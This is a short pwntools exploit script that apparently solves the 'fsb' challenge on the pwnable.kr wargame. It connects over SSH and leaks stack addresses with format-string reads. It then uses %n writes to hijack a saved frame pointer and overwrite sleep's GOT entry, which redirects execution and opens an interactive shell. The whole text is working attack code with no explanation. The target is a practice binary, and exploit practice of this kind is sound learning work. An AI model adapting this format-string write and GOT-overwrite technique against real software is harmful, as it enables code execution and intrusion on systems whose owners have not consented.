###fmt string attack, takes some time due to large %c values

from pwn import *

###Utils
def send_payload(payload):
    r.sendlineafter(')\n',payload)

###Addr
sleep_got = 0x804a008
target = 0x80486ab


###Exploit
s = ssh(host='pwnable.kr',port=2222,
        user='fsb',
        password='guest')
r = s.process('./fsb')

###Leak stack addr
payload = "AAA%14$pAAA%18$pAAA"
send_payload(payload)
leaks = r.recvline().strip().decode().split('AAA')
esp = int(leaks[1][2:],16)-0x50
ebp = int(leaks[2][2:],16)
offset=(ebp-esp)//4 

###hijack ebp of main
payload = '%'+str(sleep_got)+'c%18$n'
send_payload(payload)

###overwrite sleep got
payload = '%'+str(target&0xffff)+'c%'+str(offset)+'$hn'
send_payload(payload)

###gibberish
payload = "AAAAAAAA"
send_payload(payload)

r.interactive(prompt='')
